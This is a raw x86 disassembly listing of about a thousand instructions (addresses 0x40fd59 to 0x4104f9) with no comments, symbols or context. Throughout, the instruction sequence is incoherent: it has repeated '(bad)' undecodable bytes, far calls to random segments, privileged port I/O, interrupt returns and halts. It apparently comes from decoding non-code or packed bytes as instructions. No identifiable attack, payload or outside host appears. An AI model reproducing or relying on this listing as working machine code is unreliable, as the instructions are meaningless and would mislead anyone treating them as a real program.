  40fd59:	sbb    al,0xfd
  40fd5b:	call   0xa31c:0x4f0b7664
  40fd62:	push   esi
  40fd63:	test   al,0x78
  40fd65:	pusha  
  40fd66:	iret   
  40fd67:	dec    ecx
  40fd68:	mov    ds:0xc5bf2744,eax
  40fd6d:	pop    es
  40fd6e:	imul   ebx,DWORD PTR [edi+0x1e85cc30],0x56206f2
  40fd78:	sbb    esi,edx
  40fd7a:	mov    esi,0x99760a3
  40fd7f:	or     BYTE PTR ds:0x9fd1aa0,dh
  40fd85:	mov    esp,0x3d37b8a4
  40fd8a:	cmp    eax,0x842703c0
  40fd8f:	xor    ah,BYTE PTR [edi]
  40fd91:	mov    cs,esp
  40fd93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd94:	data16 adc BYTE PTR [esi-0x43dfa685],dh
  40fd9b:	pop    eax
  40fd9c:	out    0x68,eax
  40fd9e:	loope  0x40fe11
  40fda0:	ds jmp 0xefd54a0c
  40fda6:	cmp    eax,0xeda0508f
  40fdab:	xor    eax,0xde6dac6f
  40fdb0:	pop    esi
  40fdb1:	push   0x71dd3171
  40fdb6:	rol    BYTE PTR [esi+0x1b],cl
  40fdb9:	cmp    edx,DWORD PTR [esi]
  40fdbb:	sub    bh,BYTE PTR [ebx]
  40fdbd:	push   ss
  40fdbe:	mov    BYTE PTR [ecx-0x7c6b8123],bl
  40fdc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fdc5:	sbb    ecx,eax
  40fdc7:	call   0xe323:0x4ed645b6
  40fdce:	cmp    al,0x9d
  40fdd0:	and    dh,0xa2
  40fdd3:	push   0xe4fa5c54
  40fdd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fdd9:	jae    0x40fd6b
  40fddb:	out    dx,al
  40fddc:	sahf   
  40fddd:	xchg   ecx,eax
  40fdde:	sub    al,0x45
  40fde0:	xor    DWORD PTR [ebx+0x3c],ebx
  40fde3:	scas   al,BYTE PTR es:[edi]
  40fde4:	xor    bl,cl
  40fde6:	xor    al,0x91
  40fde8:	jle    0x40fe2c
  40fdea:	cwde   
  40fdeb:	xor    al,0xc
  40fded:	dec    ecx
  40fdee:	inc    eax
  40fdef:	lods   eax,DWORD PTR ds:[esi]
  40fdf0:	sbb    BYTE PTR [bp+di],ah
  40fdf3:	mov    esp,fs
  40fdf5:	add    eax,0x52a4a33b
  40fdfa:	call   0xe3f1:0xd869fc14
  40fe01:	sbb    eax,0x760d67fb
  40fe06:	int3   
  40fe07:	ret    
  40fe08:	mov    esp,0xde4eb62f
  40fe0d:	pop    es
  40fe0e:	xor    cl,BYTE PTR [esi]
  40fe10:	add    DWORD PTR [ebx-0x771319ad],edx
  40fe16:	aam    0xaa
  40fe18:	into   
  40fe19:	out    dx,eax
  40fe1a:	or     BYTE PTR [ebx+eax*2-0x4d080154],al
  40fe21:	push   ecx
  40fe22:	std    
  40fe23:	mov    bh,0xfd
  40fe25:	(bad)  
  40fe26:	mov    edi,0xe70ca53f
  40fe2b:	aaa    
  40fe2c:	retf   
  40fe2d:	push   ebp
  40fe2e:	scas   eax,DWORD PTR es:[edi]
  40fe2f:	xchg   ecx,eax
  40fe30:	shr    DWORD PTR [edi],1
  40fe32:	mov    edx,0x87143a8e
  40fe37:	loopne 0x40fdfc
  40fe39:	ror    BYTE PTR [ecx-0x5a9f9b5e],1
  40fe3f:	fcom   DWORD PTR [ebp+0x44b8759]
  40fe45:	inc    edi
  40fe46:	mov    eax,0xd4452409
  40fe4b:	xchg   ecx,ebp
  40fe4d:	std    
  40fe4e:	add    eax,0x19355d0
  40fe53:	lods   al,BYTE PTR ds:[esi]
  40fe54:	jecxz  0x40feb6
  40fe56:	imul   ecx,DWORD PTR [ebx],0xffffff8f
  40fe59:	push   edx
  40fe5a:	fistp  WORD PTR [ebx+0x4f4222ea]
  40fe60:	mov    DWORD PTR [esp-0x4b],ecx
  40fe64:	xlat   BYTE PTR ds:[ebx]
  40fe65:	cmp    edi,DWORD PTR [ebx+0xc]
  40fe68:	mov    esi,0x2cc1219d
  40fe6d:	sub    esp,esi
  40fe6f:	pop    esi
  40fe70:	pmullw mm7,mm2
  40fe73:	cmp    al,0x75
  40fe75:	mov    BYTE PTR [ebx],al
  40fe77:	stos   BYTE PTR es:[edi],al
  40fe78:	cmp    esp,DWORD PTR [ecx+0x1c970fcf]
  40fe7e:	fstp   st(4)
  40fe80:	and    DWORD PTR [edi+0x3f9e1902],0x6e8f5013
  40fe8a:	pop    es
  40fe8b:	ret    
  40fe8c:	adc    eax,0xe2cd1e95
  40fe91:	pop    edi
  40fe92:	cmp    DWORD PTR [edx+0x6a],ecx
  40fe95:	out    dx,eax
  40fe96:	test   BYTE PTR [edx+ebx*4+0x79],bh
  40fe9a:	in     eax,0xd3
  40fe9c:	scas   eax,DWORD PTR es:[edi]
  40fe9d:	and    eax,0x2f93b3f6
  40fea2:	pushf  
  40fea3:	jg     0x40fe47
  40fea5:	in     al,0x55
  40fea7:	ins    DWORD PTR es:[edi],dx
  40fea8:	lahf   
  40fea9:	daa    
  40feaa:	inc    esp
  40feab:	iret   
  40feac:	push   ebp
  40fead:	ja     0x40fe9b
  40feaf:	(bad)  
  40feb0:	fldenv [edi]
  40feb2:	mov    bh,0xdb
  40feb4:	xlat   BYTE PTR ds:[ebx]
  40feb5:	jmp    0xef8d10f6
  40feba:	ret    0xb3a8
  40febd:	(bad)  
  40febe:	push   ss
  40febf:	xor    al,0x41
  40fec1:	data16 in al,dx
  40fec3:	inc    esi
  40fec4:	test   al,0xb7
  40fec6:	fdivp  st(5),st
  40fec8:	in     eax,0x38
  40feca:	(bad)  
  40fecb:	sub    bl,ah
  40fecd:	aad    0x16
  40fecf:	sbb    BYTE PTR [ebx+0x48a303a1],al
  40fed5:	jns    0x40fe9c
  40fed7:	fisttp WORD PTR [esi]
  40fed9:	mov    ebx,0xa9342a4d
  40fede:	setp   al
  40fee1:	mov    edx,0x368e0e54
  40fee6:	gs mov ah,0x8a
  40fee9:	hlt    
  40feea:	cmp    eax,0xb8784429
  40feef:	adc    esi,DWORD PTR [ebx+0x6b766a77]
  40fef5:	pop    es
  40fef6:	outs   dx,BYTE PTR ds:[esi]
  40fef7:	push   edi
  40fef8:	dec    ebp
  40fef9:	jle    0x40fee0
  40fefb:	(bad)  
  40fefc:	stos   BYTE PTR es:[edi],al
  40fefd:	adc    eax,DWORD PTR [si]
  40ff00:	dec    ebp
  40ff01:	push   ss
  40ff02:	fidiv  DWORD PTR [eax]
  40ff04:	xchg   edx,eax
  40ff05:	hlt    
  40ff06:	popa   
  40ff07:	call   0x4f6ed85b
  40ff0c:	mov    bl,0x9f
  40ff0e:	(bad)  
  40ff0f:	and    BYTE PTR [edx],bh
  40ff11:	sar    DWORD PTR [ecx-0xba06682],1
  40ff17:	out    0x83,eax
  40ff19:	into   
  40ff1a:	(bad)  
  40ff1d:	clc    
  40ff1e:	fstp   DWORD PTR [edx-0x39]
  40ff21:	pop    ebp
  40ff22:	push   0xffffffb3
  40ff24:	imul   esi,esp,0xf8035446
  40ff2a:	or     BYTE PTR [ecx-0xa5693c8],bl
  40ff30:	pop    ds
  40ff31:	and    eax,0xbf4f575f
  40ff36:	fsubr  DWORD PTR [ecx]
  40ff38:	mov    bl,0x4e
  40ff3a:	adc    ebx,DWORD PTR ds:0xabdde8b8
  40ff40:	inc    esi
  40ff41:	jnp    0x40ff1f
  40ff43:	push   ds
  40ff44:	stos   DWORD PTR es:[edi],eax
  40ff45:	xor    eax,0xe1d74f99
  40ff4a:	add    eax,0xb280f86b
  40ff4f:	lahf   
  40ff50:	popf   
  40ff51:	(bad)  
  40ff53:	push   ss
  40ff54:	jb     0x40fee9
  40ff56:	adc    eax,ebx
  40ff58:	mov    dl,0xe2
  40ff5a:	jg     0x40ff25
  40ff5c:	jmp    DWORD PTR [eax+edx*2-0x65]
  40ff60:	mov    dh,0x63
  40ff62:	xor    al,0x1a
  40ff64:	or     eax,0x30b2fbb
  40ff69:	fsub   DWORD PTR [eax]
  40ff6b:	aaa    
  40ff6c:	dec    ebp
  40ff6d:	inc    eax
  40ff6f:	jae    0x40ff29
  40ff71:	ins    BYTE PTR es:[edi],dx
  40ff72:	fwait
  40ff73:	outs   dx,DWORD PTR ds:[esi]
  40ff74:	inc    esp
  40ff75:	mov    bl,0xb0
  40ff77:	jle    0x40ff35
  40ff79:	jno    0x40ffb1
  40ff7b:	das    
  40ff7c:	cdq    
  40ff7d:	or     esp,eax
  40ff7f:	loope  0x40ffbb
  40ff81:	jmp    0x40ff6f
  40ff83:	xchg   esp,eax
  40ff84:	adc    BYTE PTR [ebx+0x42af4705],0x3e
  40ff8b:	mov    al,ds:0x35b843d6
  40ff90:	ret    0x97af
  40ff93:	pop    eax
  40ff94:	retf   
  40ff95:	out    0x1,eax
  40ff97:	pop    ebp
  40ff98:	(bad)  
  40ff99:	jmp    0x539d:0x1f64b372
  40ffa0:	xlat   BYTE PTR ds:[ebx]
  40ffa1:	xor    BYTE PTR [eax+0x74c153cb],bh
  40ffa7:	push   ss
  40ffa8:	or     al,0xe4
  40ffaa:	cli    
  40ffab:	sub    eax,0xac1d95d
  40ffb0:	pop    ebp
  40ffb1:	fcmovbe st,st(1)
  40ffb3:	int    0xee
  40ffb5:	jmp    0x40ff5a
  40ffb7:	xchg   BYTE PTR [edx+0xe4c0738],bl
  40ffbd:	cdq    
  40ffbe:	pop    ds
  40ffbf:	call   FWORD PTR [edx]
  40ffc1:	add    al,0x26
  40ffc3:	add    edx,esi
  40ffc5:	jecxz  0x40ffac
  40ffc7:	test   eax,0xc21bb01e
  40ffcc:	jbe    0x410045
  40ffce:	bound  esi,QWORD PTR [edi-0x795018fe]
  40ffd4:	ret    
  40ffd5:	call   0xe9e1:0xd5d5ed75
  40ffdc:	push   cs
  40ffdd:	push   ds
  40ffde:	dec    edi
  40ffdf:	fiadd  DWORD PTR [edi+0x1b9bb69a]
  40ffe5:	jmp    0x40ff92
  40ffe7:	out    dx,al
  40ffe8:	inc    ebp
  40ffe9:	xchg   edx,eax
  40ffea:	in     al,0xdd
  40ffec:	pop    ebx
  40ffed:	popa   
  40ffee:	in     al,dx
  40ffef:	(bad)
  40fff2:	sub    BYTE PTR [ebx],bl
  40fff4:	sbb    al,BYTE PTR [esi-0x71e9086a]
  40fffa:	jle    0x40ffc1
  40fffc:	imul   ebx,DWORD PTR [ebp-0xb],0x72029011
  410003:	add    al,0x5b
  410005:	cdq    
  410006:	lea    esi,[ebp-0x3d1a475f]
  41000c:	push   ecx
  41000d:	rcl    DWORD PTR [eax+edx*8],cl
  410010:	shl    DWORD PTR [ebp-0x45],cl
  410013:	(bad)  
  410014:	pop    esi
  410015:	push   ss
  410016:	pop    ss
  410017:	iret   
  410018:	lds    esp,FWORD PTR [edx]
  41001a:	mov    dh,0xcc
  41001c:	cmp    ebp,esi
  41001e:	cwde   
  41001f:	xchg   esp,eax
  410020:	stos   DWORD PTR es:[edi],eax
  410021:	jle    0x410061
  410023:	mov    esp,0x928243f8
  410028:	cmp    eax,0x194fe66
  41002d:	ins    DWORD PTR es:[edi],dx
  41002e:	outs   dx,DWORD PTR ds:[esi]
  41002f:	loop   0x410049
  410031:	xor    al,0x62
  410033:	jg     0x41001b
  410035:	add    edi,ebp
  410037:	mov    ds:0x24f19b41,eax
  41003c:	or     eax,0x4c3c22c
  410041:	cwde   
  410042:	(bad)  
  410043:	jp     0x410024
  410045:	fild   QWORD PTR [eax+0xed3b7a5]
  41004b:	lds    ebp,FWORD PTR [ecx+ecx*8]
  41004e:	inc    ebp
  41004f:	or     ecx,DWORD PTR [esi]
  410051:	inc    edi
  410052:	inc    esp
  410053:	mov    ds:0xae82d672,eax
  410058:	lods   al,BYTE PTR ds:[esi]
  410059:	push   es
  41005a:	shr    BYTE PTR fs:[esi-0x6d],0xd1
  41005f:	shl    BYTE PTR [esi],1
  410061:	test   al,0xae
  410063:	cmc    
  410064:	lahf   
  410065:	daa    
  410066:	mov    al,0x55
  410068:	push   ebx
  410069:	scas   eax,DWORD PTR es:[edi]
  41006a:	adc    ebp,esp
  41006c:	hlt    
  41006d:	adc    BYTE PTR [ecx+0x660ce65c],al
  410073:	lock xchg edx,eax
  410075:	mov    ?,WORD PTR [edi+0x11]
  410078:	mov    bh,ch
  41007a:	sub    ah,BYTE PTR [ecx+0x1ff1fc65]
  410080:	jno    0x41001a
  410082:	xor    al,0x82
  410084:	lds    ecx,FWORD PTR [eax]
  410086:	aam    0xa6
  410088:	fiadd  DWORD PTR [ebx+esi*8]
  41008b:	adc    edi,DWORD PTR [ecx]
  41008d:	push   ss
  41008e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41008f:	jno    0x410036
  410091:	mov    ds:0xe778c038,eax
  410096:	lea    eax,[ebx-0x53]
  410099:	lds    edi,FWORD PTR [edx+0x125be704]
  41009f:	mov    WORD PTR [ecx+0x69],cs
  4100a2:	pop    ds
  4100a3:	lds    edx,FWORD PTR [edx+0x6d]
  4100a6:	xchg   esi,eax
  4100a7:	call   0x677f:0x8a90f043
  4100ae:	push   cs
  4100af:	shr    BYTE PTR [ebx+esi*1],1
  4100b2:	xor    DWORD PTR [edx+0x6e99695d],esi
  4100b8:	jg     0x410123
  4100ba:	inc    esp
  4100bb:	std    
  4100bc:	arpl   WORD PTR [ebp+eax*4-0x29],ax
  4100c0:	adc    al,0x3e
  4100c2:	call   0x448e:0x593aa6bf
  4100c9:	loope  0x4100bf
  4100cb:	sbb    DWORD PTR [eax-0x25],ebp
  4100ce:	push   es
  4100cf:	dec    ebx
  4100d0:	jmp    FWORD PTR [ebx+0x52]
  4100d3:	cmp    BYTE PTR [eax],al
  4100d5:	ret    0x452c
  4100d8:	mov    ah,0x7f
  4100da:	ins    DWORD PTR es:[edi],dx
  4100db:	test   DWORD PTR [edx+0x1ff581a0],0x918b9328
  4100e5:	call   0xe87b:0x5989e81a
  4100ec:	jg     0x4100d7
  4100ee:	idiv   DWORD PTR [eax]
  4100f0:	cmp    al,0x77
  4100f2:	daa    
  4100f3:	int    0xec
  4100f5:	push   ecx
  4100f6:	sub    edi,DWORD PTR [edx+ecx*8]
  4100f9:	cmp    eax,0x32b9ef0
  4100fe:	sti    
  4100ff:	out    dx,al
  410100:	cdq    
  410101:	loopne 0x4100f1
  410103:	frstor [edx+esi*2+0x73]
  410107:	push   0x3c81f28a
  41010c:	jns    0x41018a
  41010e:	cmp    esp,esi
  410110:	dec    eax
  410111:	fst    QWORD PTR [ebx+0x1a3cb539]
  410117:	push   0xb
  410119:	lds    esp,FWORD PTR [ecx+0x46]
  41011c:	js     0x410158
  41011e:	push   es
  41011f:	mov    esi,0xe4a72dc4
  410124:	push   edi
  410125:	push   es
  410126:	xchg   DWORD PTR [ecx-0x47],esi
  410129:	fwait
  41012a:	arpl   WORD PTR [ecx+0x5],bp
  41012d:	lahf   
  41012e:	pop    edx
  41012f:	inc    ecx
  410130:	mov    al,ds:0xce25802b
  410135:	xchg   edi,eax
  410136:	and    BYTE PTR [ebp-0x2c],ch
  410139:	jge    0x41010f
  41013b:	rcl    ebp,1
  41013d:	mov    bh,0x7d
  41013f:	es int 0xd0
  410142:	mov    cl,0x33
  410144:	repnz stc 
  410146:	js     0x4100db
  410148:	mov    esi,DWORD PTR [eax]
  41014a:	addr16 mov dh,0xc2
  41014d:	and    DWORD PTR [ebx-0x2d],ecx
  410150:	sub    bh,ch
  410152:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410154:	sbb    al,0xc5
  410156:	inc    ebx
  410157:	add    bh,BYTE PTR [esi+0x7ccbec9]
  41015d:	retf   0x9ab5
  410160:	cmp    al,al
  410162:	sbb    DWORD PTR [edi+0x4d],esi
  410165:	push   esp
  410166:	test   al,0x6a
  410168:	sar    DWORD PTR [esi+0x64656ca3],cl
  41016e:	rcr    DWORD PTR [ecx],cl
  410170:	shl    BYTE PTR [esi-0x51f244be],cl
  410176:	xchg   dl,ah
  410178:	ss aas 
  41017a:	and    DWORD PTR [edx-0x62],ecx
  41017d:	mov    es,WORD PTR [edi]
  41017f:	iret   
  410180:	xchg   esp,eax
  410181:	popa   
  410182:	jg     0x4101d4
  410184:	sub    edi,DWORD PTR ds:0x5d8fc580
  41018a:	xlat   BYTE PTR ds:[ebx]
  41018b:	fdiv   st(6),st
  41018d:	xor    al,0xf6
  41018f:	and    eax,0x2440634c
  410194:	clc    
  410195:	repz (bad)
  410198:	shr    DWORD PTR [esi],cl
  41019a:	cmp    edi,esp
  41019c:	dec    ecx
  41019d:	call   0x449549c3
  4101a2:	mov    cl,0x18
  4101a4:	imul   esi,DWORD PTR [ebx],0x2865ba07
  4101aa:	fiadd  DWORD PTR [edx]
  4101ac:	int3   
  4101ad:	test   bh,al
  4101af:	and    al,BYTE PTR [ecx+0x3a697d6]
  4101b5:	jns    0x4101dd
  4101b7:	data16 jle 0x4101df
  4101ba:	dec    esi
  4101bb:	jp     0x410222
  4101bd:	xlat   BYTE PTR ds:[ebx]
  4101be:	aas    
  4101bf:	jo     0x4101d5
  4101c1:	or     ecx,DWORD PTR [esi]
  4101c3:	push   0x65
  4101c5:	jmp    FWORD PTR [ecx+ecx*1-0x2fee43f6]
  4101cc:	sbb    esp,esi
  4101ce:	mov    ebx,0x10528c62
  4101d3:	into   
  4101d4:	outs   dx,BYTE PTR ds:[esi]
  4101d5:	loop   0x410185
  4101d7:	iret   
  4101d8:	push   0x896a2ca9
  4101dd:	loope  0x4101c7
  4101df:	or     DWORD PTR [esi+0x78f971a2],esp
  4101e5:	mov    edi,0x1f68c55f
  4101ea:	(bad)  
  4101eb:	push   edx
  4101ec:	ja     0x410194
  4101ee:	mov    ch,0x2e
  4101f0:	mov    edi,0x15737c3e
  4101f5:	repnz push ebx
  4101f7:	jmp    0x55f7:0xd2cea06e
  4101fe:	sahf   
  4101ff:	loopne 0x4101ac
  410201:	lds    esp,FWORD PTR [eax-0x67]
  410204:	add    al,0x4d
  410206:	scas   eax,DWORD PTR es:[edi]
  410207:	inc    ebx
  410208:	jae    0x4101b0
  41020a:	data16 fild DWORD PTR [ebp-0x76]
  41020e:	xlat   BYTE PTR ds:[ebx]
  41020f:	repz test al,0xd5
  410212:	pop    ss
  410213:	test   eax,0x2fe02f9a
  410218:	leave  
  410219:	lahf   
  41021a:	sbb    dh,al
  41021c:	fidiv  WORD PTR [edx]
  41021e:	repnz xor al,0xc
  410221:	mov    ch,0x5e
  410223:	cmp    DWORD PTR fs:[esi+ebx*8+0x535e74e1],ebx
  41022b:	or     eax,DWORD PTR [ebp+0x718ab390]
  410231:	das    
  410232:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410233:	(bad)  [edx]
  410235:	fild   DWORD PTR [edx+0x5a50a553]
  41023b:	repnz cmp BYTE PTR [edi+0x24],dh
  41023f:	ins    DWORD PTR es:[edi],dx
  410240:	xchg   ecx,eax
  410241:	shr    DWORD PTR [edi+0x3f36b90e],cl
  410247:	xor    eax,DWORD PTR [esp+ebp*2+0x75]
  41024b:	xor    al,0xef
  41024d:	sub    BYTE PTR [eax+0xa],cl
  410250:	lds    eax,FWORD PTR [esi]
  410252:	cmp    ebp,ebp
  410254:	jp     0x41028c
  410256:	mov    eax,0x795a239d
  41025b:	cmp    ebp,ecx
  41025d:	xor    al,BYTE PTR [edx]
  41025f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410260:	imul   dh
  410262:	or     al,0x5e
  410264:	outs   dx,DWORD PTR ds:[esi]
  410265:	stos   BYTE PTR es:[edi],al
  410266:	fsubrp st(4),st
  410268:	cmp    DWORD PTR [esi+0x4af58155],edx
  41026e:	sub    eax,0x8d084978
  410273:	std    
  410274:	cld    
  410275:	fs cwde 
  410277:	adc    bh,BYTE PTR [esi-0x30216341]
  41027d:	jno    0x41023a
  41027f:	pop    ebx
  410280:	dec    esp
  410281:	sbb    al,0xde
  410283:	ss loop 0x41023a
  410286:	xor    ch,BYTE PTR [ebp+edx*4+0x5445052]
  41028d:	out    0xc1,al
  41028f:	enter  0x1719,0x56
  410293:	lock push esi
  410295:	adc    DWORD PTR [ebx-0x267b9d1d],0xffffffab
  41029c:	mov    ds:0x645c37c9,eax
  4102a1:	sub    dh,al
  4102a3:	inc    ebx
  4102a4:	pop    ebx
  4102a5:	aad    0xee
  4102a7:	cmp    dh,dh
  4102a9:	rol    BYTE PTR [edx],0x80
  4102ac:	icebp  
  4102ad:	cmp    eax,0x9fd8a169
  4102b2:	fucomp st(5)
  4102b4:	shl    DWORD PTR [ebx-0x3],cl
  4102b7:	retf   0x656e
  4102ba:	icebp  
  4102bb:	inc    edx
  4102bc:	inc    ebp
  4102bd:	inc    ebx
  4102be:	xor    ch,BYTE PTR [ebx+0x5d]
  4102c1:	jl     0x410326
  4102c3:	ss or  eax,0x9dd0ce19
  4102c9:	stos   BYTE PTR es:[edi],al
  4102ca:	mov    ds:0x24916263,al
  4102cf:	fsub   DWORD PTR [edi+eax*8+0x3]
  4102d3:	daa    
  4102d4:	jl     0x410334
  4102d6:	inc    edi
  4102d7:	ret    0x456d
  4102da:	push   eax
  4102db:	lock push ecx
  4102dd:	cmp    al,0xd5
  4102df:	ins    DWORD PTR es:[edi],dx
  4102e0:	mov    al,0x5c
  4102e2:	jecxz  0x41027e
  4102e4:	add    DWORD PTR [eax-0x4a],ecx
  4102e7:	punpckhwd mm3,mm3
  4102ea:	xor    BYTE PTR [esi],al
  4102ec:	jbe    0x410325
  4102ee:	sahf   
  4102ef:	cld    
  4102f0:	cmp    ebp,ecx
  4102f2:	sbb    BYTE PTR [eax],cl
  4102f4:	jb     0x6f8f1f41
  4102fa:	pop    ebx
  4102fb:	fsin   
  4102fd:	aaa    
  4102fe:	ins    BYTE PTR es:[edi],dx
  4102ff:	inc    ebx
  410300:	push   esi
  410301:	cmp    DWORD PTR [eax+edi*8+0x1a1d2866],ecx
  410308:	ret    
  410309:	mov    ?,WORD PTR [edi]
  41030b:	pop    eax
  41030c:	out    dx,al
  41030d:	fldcw  WORD PTR [ecx-0x1e58ac54]
  410313:	sbb    BYTE PTR [eax+edi*1+0x13a2cba5],ah
  41031a:	sbb    eax,0x2cc0ca82
  41031f:	jno    0x41034c
  410321:	and    DWORD PTR [eax+eax*4+0x172b5c83],ebx
  410328:	stos   BYTE PTR es:[edi],al
  410329:	inc    edi
  41032a:	mov    bl,0x24
  41032c:	cmp    al,0xc
  41032e:	xor    eax,0xed5be183
  410333:	xchg   al,dl
  410335:	or     DWORD PTR [esi-0x7b],ebp
  410338:	adc    DWORD PTR [esi+0x73d9966e],esi
  41033e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41033f:	and    esp,DWORD PTR [esi-0x590f8780]
  410345:	sbb    DWORD PTR [ebx+ebx*1-0x5a],edx
  410349:	pop    esi
  41034a:	fisubr DWORD PTR [eax]
  41034c:	sub    BYTE PTR [edi+0x60],dl
  41034f:	lock add al,0x6e
  410352:	arpl   WORD PTR [ecx],di
  410354:	inc    DWORD PTR [eax]
  410356:	push   ss
  410357:	rcr    BYTE PTR [ecx-0x295f58e4],cl
  41035d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41035e:	push   0xfffffff6
  410360:	pop    ebp
  410361:	sti    
  410362:	xor    DWORD PTR [ebp-0x23],esi
  410365:	mov    esi,0x412c8bc
  41036a:	pop    ss
  41036b:	aad    0x55
  41036d:	xchg   edi,eax
  41036e:	xor    al,BYTE PTR [ebp-0xa]
  410371:	cmp    DWORD PTR [edx+0x15],edi
  410374:	cld    
  410375:	mov    bl,0xef
  410377:	push   ds
  410378:	enter  0xc87e,0x54
  41037c:	push   0x19f99a7
  410381:	ins    BYTE PTR es:[edi],dx
  410382:	mov    gs,WORD PTR [edx+0x31]
  410385:	cmp    bl,BYTE PTR [edx+0x11]
  410388:	xor    BYTE PTR [ecx+0x4],bh
  41038b:	push   ebp
  41038c:	xchg   ecx,eax
  41038d:	iret   
  41038e:	mov    ebp,0x49601101
  410393:	pop    es
  410394:	xchg   ebx,edi
  410396:	data16 out dx,al
  410398:	mov    ?,WORD PTR [edi+edi*2+0x51a815a5]
  41039f:	inc    ecx
  4103a0:	xor    al,0xa6
  4103a2:	pop    ecx
  4103a3:	mov    edx,0x8a702bd6
  4103a8:	(bad)  
  4103a9:	(bad)  
  4103aa:	xor    DWORD PTR [eax+esi*2-0x665e8d94],esi
  4103b1:	dec    ebp
  4103b2:	mov    bh,0x66
  4103b4:	cdq    
  4103b5:	dec    ecx
  4103b6:	aas    
  4103b7:	inc    edx
  4103b8:	xlat   BYTE PTR ds:[ebx]
  4103b9:	or     al,0xb1
  4103bb:	out    dx,eax
  4103bc:	push   0xfffffff1
  4103be:	xor    BYTE PTR [ecx],0x76
  4103c1:	mov    eax,ds:0x89e59935
  4103c6:	mov    WORD PTR [ebp+edx*2-0x38],ss
  4103ca:	leave  
  4103cb:	push   edi
  4103cc:	pop    eax
  4103cd:	adc    eax,DWORD PTR [ecx+0x99217ae]
  4103d3:	mov    BYTE PTR [edi+0x6d],cl
  4103d6:	adc    al,0x50
  4103d8:	push   ecx
  4103d9:	mov    edx,0x18e9a1e9
  4103de:	cmp    BYTE PTR [ebx-0x77],ah
  4103e1:	xchg   ebp,eax
  4103e2:	jns    0x41037c
  4103e4:	adc    dh,bl
  4103e6:	retf   0xadc3
  4103e9:	cli    
  4103ea:	in     eax,0xcf
  4103ec:	nop
  4103ed:	in     eax,0x65
  4103ef:	aad    0x3b
  4103f1:	ret    0xb3f5
  4103f4:	ds mov edx,0x4893c90f
  4103fa:	test   al,0x4a
  4103fc:	xchg   ebx,eax
  4103fd:	imul   ebp,esi,0x49
  410400:	loop   0x410443
  410402:	xor    eax,0xb555a036
  410407:	lods   al,BYTE PTR ds:[esi]
  410408:	ret    
  410409:	cmp    al,BYTE PTR [eax-0x52]
  41040c:	mov    al,0x37
  41040e:	aas    
  41040f:	inc    eax
  410410:	dec    edx
  410411:	ds (bad) 
  410414:	sbb    ah,bh
  410416:	dec    eax
  410417:	pop    esp
  410418:	push   eax
  410419:	pop    es
  41041a:	jge    0x41042f
  41041c:	adc    DWORD PTR [edx+ebx*4+0x78a6cb56],esi
  410423:	inc    ebp
  410424:	fiadd  WORD PTR [edx]
  410426:	inc    eax
  410427:	jae    0x41047e
  410429:	out    0x7a,al
  41042b:	int3   
  41042c:	dec    ebx
  41042d:	shl    BYTE PTR [esi],1
  41042f:	mov    ah,0x51
  410431:	imul   edx,ebp,0x72
  410434:	mov    al,BYTE PTR [ecx+0x308fc46f]
  41043a:	mov    eax,0x822888ea
  41043f:	fdivr  DWORD PTR [ecx+0x39eb51f0]
  410445:	stos   DWORD PTR es:[edi],eax
  410446:	jnp    0x41045c
  410448:	frstor [ebp+0x7357f7c]
  41044e:	and    ebx,ecx
  410450:	cdq    
  410451:	sub    BYTE PTR [edx],0xa
  410454:	repnz out 0x4f,al
  410457:	pop    ebp
  410458:	xchg   ecx,eax
  410459:	push   ss
  41045a:	add    edx,DWORD PTR [ebx+0x40]
  41045d:	gs mov cl,0xfb
  410460:	aad    0x92
  410462:	add    DWORD PTR [esi+0x1e9535ee],edx
  410468:	int    0xb9
  41046a:	push   ds
  41046b:	mov    dh,0x5
  41046d:	in     al,0x45
  41046f:	mov    edi,0xf1d53af7
  410474:	fiadd  DWORD PTR [esi]
  410476:	mov    ebp,0xa7fc1d4d
  41047b:	mov    ah,0x99
  41047d:	loop   0x41046b
  41047f:	pop    ss
  410480:	sbb    DWORD PTR [edx-0xe737ade],ecx
  410486:	jno    0x4104ed
  410488:	rcr    dl,cl
  41048a:	and    ebx,DWORD PTR fs:[edi]
  41048d:	sub    dl,dl
  41048f:	xor    al,0xd
  410491:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410492:	sub    esp,DWORD PTR [ebx+0x45]
  410495:	dec    ebx
  410497:	xchg   edi,eax
  410498:	fldcw  WORD PTR [edi]
  41049a:	jae    0x410478
  41049c:	rcl    bh,1
  41049e:	jnp    0x4104db
  4104a0:	ss inc ecx
  4104a2:	xchg   BYTE PTR [ecx],ch
  4104a4:	enter  0xf983,0xc1
  4104a8:	shl    DWORD PTR [ebx-0x18ccd3ec],cl
  4104ae:	xchg   edi,eax
  4104af:	push   esp
  4104b0:	sbb    eax,0x857d9a6b
  4104b5:	adc    BYTE PTR ds:0xed12773c,dh
  4104bb:	push   cs
  4104bc:	enter  0xf82d,0x8b
  4104c0:	pop    ss
  4104c1:	dec    ecx
  4104c2:	fwait
  4104c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104c4:	in     al,0x70
  4104c6:	cmp    eax,0x6516b6bd
  4104cb:	in     eax,0x6a
  4104cd:	add    ebx,DWORD PTR [edx]
  4104cf:	fcmovnb st,st(7)
  4104d1:	inc    esp
  4104d2:	pusha  
  4104d3:	sbb    eax,esi
  4104d5:	pushf  
  4104d6:	or     eax,0x818742b6
  4104db:	add    DWORD PTR [edi],eax
  4104dd:	fidivr DWORD PTR [edi+edx*8-0x39]
  4104e1:	xchg   ebx,eax
  4104e2:	in     eax,dx
  4104e3:	xchg   ebx,eax
  4104e4:	pop    edi
  4104e5:	and    bh,ah
  4104e7:	mov    ah,0xc2
  4104e9:	jo     0x410526
  4104eb:	cmp    al,0xff
  4104ed:	pop    ebx
  4104ee:	lods   eax,DWORD PTR ds:[esi]
  4104ef:	cmc    
  4104f0:	push   es
  4104f1:	cs pusha 
  4104f3:	repnz into 
  4104f5:	xchg   DWORD PTR [edi+0xd],esi
  4104f8:	push   ss
  4104f9:	(bad)
